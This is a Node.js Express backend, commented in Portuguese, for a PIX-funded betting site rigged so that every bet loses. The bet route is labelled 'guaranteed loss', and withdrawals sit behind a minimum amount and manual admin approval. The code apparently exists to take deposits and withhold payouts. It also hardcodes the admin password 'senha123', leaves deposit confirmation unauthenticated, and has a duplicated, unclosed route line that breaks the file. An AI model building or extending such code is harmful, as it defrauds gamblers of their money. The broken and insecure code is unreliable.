const express = require('express');
const cors = require('cors');
const sqlite3 = require('sqlite3').verbose();
const QRCode = require('qrcode');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3001;

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, '../frontend'))); // Serve o frontend

// Conecta ao banco de dados SQLite
const db = new sqlite3.Database('./database.db', sqlite3.OPEN_READWRITE | sqlite3.OPEN_CREATE, (err) => {
    if (err) return console.error(err.message);
    console.log('Conectado ao DB SQLite.');
    // Cria as tabelas
    db.run(`CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, name TEXT, pix_key TEXT UNIQUE, balance REAL DEFAULT 0, status TEXT DEFAULT 'Pendente')`);
    db.run(`CREATE TABLE IF NOT EXISTS withdraw_requests (id INTEGER PRIMARY KEY, user_id INTEGER, amount REAL, status TEXT DEFAULT 'Pendente', created_at DATETIME DEFAULT CURRENT_TIMESTAMP)`);
    db.run(`CREATE TABLE IF NOT EXISTS admin_config (id INTEGER PRIMARY KEY CHECK (id = 1), pix_key TEXT, min_deposit REAL, bonus_amount REAL, min_withdraw REAL)`, (err) => {
        if (!err) db.run(`INSERT OR IGNORE INTO admin_config (id, pix_key, min_deposit, bonus_amount, min_withdraw) VALUES (1, 'SUA_CHAVE_PIX_AQUI', 50, 30, 150)`);
    });
});

// Rota principal (serve o index.html)
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend/index.html'));
});

// Rota para gerar QR Code da chave PIX do admin
app.get('/api/pix-qrcode', async (req, res) => {
    db.get('SELECT pix_key FROM admin_config WHERE id = 1', async (err, row) => {
        if (err || !row || row.pix_key === 'SUA_CHAVE_PIX_AQUI') return res.status(500).json({ error: 'Chave PIX não configurada no servidor.' });
        try {
            const qrCodeDataUrl = await QRCode.toDataURL(row.pix_key);
            res.json({ qrcode: qrCodeDataUrl, pixKey: row.pix_key });
        } catch (err) {
            res.status(500).json({ error: 'Erro ao gerar QR Code.' });
        }
    });
});

// Rota de cadastro
app.post('/api/register', (req, res) => {
    const { name, pixKey } = req.body;
    if (!name || !pixKey) return res.status(400).json({ error: 'Dados obrigatórios.' });
    const sql = 'INSERT INTO users (name, pix_key) VALUES (?, ?)';
    db.run(sql, [name, pixKey], function(err) {
        if (err) return res.status(500).json({ error: 'Erro no cadastro.' });
        res.status(201).json({ id: this.lastID, name, pixKey });
    });
});

// Rota para obter dados do usuário
app.get('/api/user/:pixKey', (req, res) => {
    db.get('SELECT * FROM users WHERE pix_key = ?', [req.params.pixKey], (err, row) => {
        if (err || !row) return res.status(404).json({ error: 'Usuário não encontrado.' });
        res.json(row);
    });
});

// Rota para simular confirmação de depósito (você ativará manualmente)
app.post('/api/confirm-deposit', (req, res) => {
    const { pixKey } = req.body;
    db.get('SELECT * FROM admin_config WHERE id = 1', (err, config) => {
        if (err || !config) return res.status(500).json({ error: 'Erro de config.' });
        const totalBalance = config.min_deposit + config.bonus_amount;
        const sql = 'UPDATE users SET balance = balance + ?, status = "Ativo" WHERE pix_key = ?';
        db.run(sql, [totalBalance, pixKey], function(err) {
            if (err) return res.status(500).json({ error: 'Erro ao creditar.' });
            res.json({ message: 'Depósito confirmado!', newBalance: totalBalance });
        });
    });
});

// Rota de aposta (perda garantida)
app.post('/api/bet', (req, res) => {
    const { pixKey, amount } = req.body;
    db.get('SELECT balance FROM users WHERE pix_key = ?', [pixKey], (err, user) => {
        if (err || !user) return res.status(404).json({ error: 'Usuário não encontrado.' });
        if (user.balance < amount) return res.status(400).json({ error: 'Saldo insuficiente.' });
        const newBalance = user.balance - amount;
        db.run('UPDATE users SET balance = ? WHERE pix_key = ?', [newBalance, pixKey], (err) => {
            if (err) return res.status(500).json({ error: 'Erro na aposta.' });
            res.json({ success: false, message: 'Perdeu! Tente novamente.', newBalance });
        });
    });
});

// Rota de solicitação de saque
app.post('/api/request-withdraw', (req, res) => {
    const { pixKey, amount } = req.body;
    db.get('SELECT * FROM users WHERE pix_key = ?', [pixKey], (err, user) => {
        if (err || !user) return res.status(404).json({ error: 'Usuário não encontrado.' });
        if (user.balance < amount) return res.status(400).json({ error: 'Saldo insuficiente.' });
        db.get('SELECT min_withdraw FROM admin_config WHERE id = 1', (err, config) => {
            if (amount < config.min_withdraw) return res.status(400).json({ error: `Saque mínimo: ${config.min_withdraw}` });
            db.run('INSERT INTO withdraw_requests (user_id, amount) VALUES (?, ?)', [user.id, amount], function(err) {
                if (err) return res.status(500).json({ error: 'Erro ao solicitar.' });
                res.json({ message: 'Saque solicitado! Aguarde processamento.' });
            });
        });
    });
});

// --- ROTAS DA ABA DE ADM ---
const ADMIN_PASSWORD = 'senha123'; // Mude esta senha!

const checkAuth = (req, res, next) => {
    if (req.headers.authorization !== `Bearer ${ADMIN_PASSWORD}`) {
        return res.status(401).json({ error: 'Não autorizado' });
    }
    next();
};

app.get('/api/admin/withdraws', checkAuth, (req, res) => {
    const sql = `SELECT wr.*, u.name, u.pix_key FROM withdraw_requests wr JOIN users u ON wr.user_id = u.id WHERE wr.status = 'Pendente'`;
    db.all(sql, [], (err, rows) => res.json(rows));
});

app.post('/api/admin/withdraw/:id/approve', checkAuth, (req, res) => {
    const { id } = req.params;
    db.run('UPDATE withdraw_requests SET status = "Aprovado" WHERE id = ?', [id], (err) => {
        if (err) return res.status(500).json({ error: 'Erro ao aprovar.' });
        res.json({ message: 'Saque aprovado!' });
    });
});

app.post('/api/admin/withdraw/:id/reject', checkAuth, (req, res)
app.post('/api/admin/withdraw/:id/reject', checkAuth, (req, res) => {
    const { id } = req.params;
    db.run('UPDATE withdraw_requests SET status = "Rejeitado" WHERE id = ?', [id], (err) => {
        if (err) return res.status(500).json({ error: 'Erro ao rejeitar.' });
        res.json({ message: 'Saque rejeitado!' });
    });
});


app.listen(PORT, () => console.log(`Servidor rodando na porta ${PORT}`));